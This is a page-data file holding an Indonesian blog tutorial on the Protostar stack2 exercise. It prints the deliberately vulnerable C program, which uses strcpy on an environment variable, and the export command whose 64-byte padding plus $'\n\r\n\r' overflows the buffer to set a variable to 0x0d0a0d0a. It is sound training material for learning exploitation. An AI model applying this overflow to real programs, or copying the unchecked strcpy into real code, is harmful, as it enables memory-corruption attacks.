{"componentChunkName":"component---src-templates-blog-post-js","path":"/belajar-reversing-protostar-stack2/","result":{"data":{"markdownRemark":{"html":"<p>Level ketiga dari protostar, stack2, dapat kita temukan pada directory <code class=\"language-text\">/opt/protostar/bin</code>. Keterangan lebih lanjut dapat dilihat pada laman resminya <a href=\"https://exploit-exercises.lains.space/protostar/stack2/\">disini</a> dan berikut merupakan output dari utilitas <code class=\"language-text\">file</code> pada berkas stack2.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 651px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3e37230d28eff962c2ba6406fc18a693/1ac66/protostar-stack1-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAjElEQVQI1yWNzQqCUBSEXUQuKqhNBaVlhARBFBWJdEWzm161H3r/d/k61xbDmRnOzDgr3TDPShZ5hX8zrItnyy3C8sXyXuOJP75qQvOmf1IMLynuIcbdx/SOis4uoit8FGU4gQRseJo8pNgQ6JpZ+h+YKC0jFdvm25Za32JTfeQWePJvB632c8PgnPADURVBArrz/soAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"hasil utilitas file pada stack2\"\n        title=\"hasil utilitas file pada stack2\"\n        src=\"/static/3e37230d28eff962c2ba6406fc18a693/1ac66/protostar-stack1-1.png\"\n        srcset=\"/static/3e37230d28eff962c2ba6406fc18a693/772e8/protostar-stack1-1.png 200w,\n/static/3e37230d28eff962c2ba6406fc18a693/e17e5/protostar-stack1-1.png 400w,\n/static/3e37230d28eff962c2ba6406fc18a693/1ac66/protostar-stack1-1.png 651w\"\n        sizes=\"(max-width: 651px) 100vw, 651px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Tidak berbeda dengan stack0 dan stack1. Sekarang mari kita lihat source codenya.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">int</span> modified<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>variable<span class=\"token punctuation\">;</span>\n\n  variable <span class=\"token operator\">=</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GREENIE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>variable <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">errx</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"please set the GREENIE environment variable\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  modified <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> variable<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>modified <span class=\"token operator\">==</span> <span class=\"token number\">0x0d0a0d0a</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"you have correctly modified the variable\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Try again, you got 0x%08x\\n\"</span><span class=\"token punctuation\">,</span> modified<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Setelah diperhatikan source code dari stack2 ini tidak jauh berbeda dengan milik <a href=\"/belajar-reversing-protostar-stack1\">stack1</a>. Pembeda diantara keduanya terletak pada nilai modified yang diminta (0x0d0a0d0a) dan pada bagian input user. Pada stack1 input dimasukkan sebagai argumen sedangkan pada stack2 ini input dimasukkan melalui fungsi <strong>getenv()</strong>. Mari kita lihat dulu apa kegunaan fungsi ini di manual.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">man</span> getenv</code></pre></div>\n<p>output :\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 658px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/d416b48ae37320338f4971d55a2d8499/889a4/protostar-stack2-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 87.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"menjalankan man getenv\"\n        title=\"menjalankan man getenv\"\n        src=\"/static/d416b48ae37320338f4971d55a2d8499/889a4/protostar-stack2-2.png\"\n        srcset=\"/static/d416b48ae37320338f4971d55a2d8499/772e8/protostar-stack2-2.png 200w,\n/static/d416b48ae37320338f4971d55a2d8499/e17e5/protostar-stack2-2.png 400w,\n/static/d416b48ae37320338f4971d55a2d8499/889a4/protostar-stack2-2.png 658w\"\n        sizes=\"(max-width: 658px) 100vw, 658px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Berdasarkan manual dari getenv, fungsi ini berguna untuk mencari environment variable dengan nama sama dengan parameter yang diberikan lalu lalu mengembalikann nilai dari environment variable tersebut. Menurut <a href=\"https://en.wikipedia.org/wiki/Environment_variable\">wikipedia</a>, environment variable adalah <strong>nilai dinamis dinamai</strong> yang mempengaruhi proses berjalan di komputer. Environment variable ini terdapat pada berbagai macam sistem operasi termasuk salah satunya linux, yang menjadi host dari protostar ini. Lanjut membaca pada laman <a href=\"https://en.wikipedia.org/wiki/Environment_variable\">wikipedia</a> untuk menampilkan seluruh environment variable pada os linux dapat menggunakan perintah <code class=\"language-text\">env</code>. Mari kita lihat apakah variable \"GREENIE\" sudah ada.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">env</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> GREENIE</code></pre></div>\n<p>Saya menyaring output env dengan utilitas <code class=\"language-text\">grep</code> agar hanya menampilkan baris dengan kata GREENIE.</p>\n<p>output :\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/1491dad54288d56a00055db0220b410c/1f083/protostar-stack2-3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAS0lEQVQI12NQcfP5r+cX8l/Z3fe/rJPnf2U33/8q7n7/lVy9/6t6+P1XcPX5z2lk81/Y0um/iJXzf1Fr5/9MOub/GbRM/zNom2FgABRnHzEGzRqqAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"menjalankan env\"\n        title=\"menjalankan env\"\n        src=\"/static/1491dad54288d56a00055db0220b410c/1f083/protostar-stack2-3.png\"\n        srcset=\"/static/1491dad54288d56a00055db0220b410c/772e8/protostar-stack2-3.png 200w,\n/static/1491dad54288d56a00055db0220b410c/e17e5/protostar-stack2-3.png 400w,\n/static/1491dad54288d56a00055db0220b410c/1f083/protostar-stack2-3.png 660w\"\n        sizes=\"(max-width: 660px) 100vw, 660px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Variable name GREENIE tidak ada. Masih pada laman <a href=\"https://en.wikipedia.org/wiki/Environment_variable\">wikipedia</a> yang sama, untuk melakukan pembuatan environment variable kita dapat menggunakan perintah <code class=\"language-text\">export VARIABLE=value</code>. Mari kita coba buat variable GREENIE dengan value berupa input yang kita gunakan sebelumnya di <a href=\"/belajar-revesing-protostar-stack1\">stack1</a>. Namun mengganti 'dcba' menjadi yang diminta, 0x0d0a0d0a. Berdasarkan <code class=\"language-text\">man ascii</code> 0d = \\r, 0a = \\n dan jangan lupakan bahwa protostar ialah litle endian.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">GREENIE</span><span class=\"token operator\">=</span>wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww<span class=\"token punctuation\">\\</span>n<span class=\"token punctuation\">\\</span>r<span class=\"token punctuation\">\\</span>n<span class=\"token punctuation\">\\</span>r\n<span class=\"token function\">env</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> GREENIE</code></pre></div>\n<p>output :\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 652px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/76bbd7290a714b0f32d6f97d7ed081a9/dba9a/protostar-stack2-4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.999999999999998%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAgklEQVQI12NQcff7r+cX/F/d0/+/kqvPfzUPPzBbFSiu6R3wX8HF+7+Mo8d/UWuX/xJ2bkDa+b+wpdN/QQvH/0KWQGwBwSJWEHEGTe/A/9o+Qf/VgIaAsIZXANggdc+A/1pAOZAFikBDQVjF3RdsGchQsGFAA0AYZBCnofV/BnXj/wD0WEH7qp7C9wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"env\"\n        title=\"env\"\n        src=\"/static/76bbd7290a714b0f32d6f97d7ed081a9/dba9a/protostar-stack2-4.png\"\n        srcset=\"/static/76bbd7290a714b0f32d6f97d7ed081a9/772e8/protostar-stack2-4.png 200w,\n/static/76bbd7290a714b0f32d6f97d7ed081a9/e17e5/protostar-stack2-4.png 400w,\n/static/76bbd7290a714b0f32d6f97d7ed081a9/dba9a/protostar-stack2-4.png 652w\"\n        sizes=\"(max-width: 652px) 100vw, 652px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Ada yang berbeda, '\\n' dan '\\r' diubah menjadi karakter 'n' dan 'r'. Hal ini sangat mungkin terjadi karena '\\n' dan '\\r' termasuk special char yang dalam manual ascii '\\n' adalah new line dan '\\r' ialah carriage ret. Dengan googling saya dapat menemukan jawabannya pada <a href=\"https://stackoverflow.com/questions/9139401/trying-to-embed-newline-in-a-variable-in-bash\">stackoverflow</a>. Mari kita modifikasi dahulu menjadi seperti berikut.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">GREENIE</span><span class=\"token operator\">=</span>wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww$<span class=\"token string\">'<span class=\"token entity\" title=\"\\n\">\\n</span>'</span>$<span class=\"token string\">'<span class=\"token entity\" title=\"\\r\">\\r</span>'</span>$<span class=\"token string\">'<span class=\"token entity\" title=\"\\n\">\\n</span>'</span>$<span class=\"token string\">'<span class=\"token entity\" title=\"\\r\">\\r</span>'</span>\n<span class=\"token function\">env</span> <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> GREENIE</code></pre></div>\n<p>Lalu kita coba jalankan executablenya.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">./stack2</code></pre></div>\n<p>output :\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 658px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/80665cc5e2637331130171046ef821e8/889a4/protostar-stack2-5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 87.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"env\"\n        title=\"env\"\n        src=\"/static/80665cc5e2637331130171046ef821e8/889a4/protostar-stack2-5.png\"\n        srcset=\"/static/80665cc5e2637331130171046ef821e8/772e8/protostar-stack2-5.png 200w,\n/static/80665cc5e2637331130171046ef821e8/e17e5/protostar-stack2-5.png 400w,\n/static/80665cc5e2637331130171046ef821e8/889a4/protostar-stack2-5.png 658w\"\n        sizes=\"(max-width: 658px) 100vw, 658px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Berhasil!</p>","frontmatter":{"title":"Protostar: stack2 "}}},"pageContext":{"slug":"/belajar-reversing-protostar-stack2/"}}}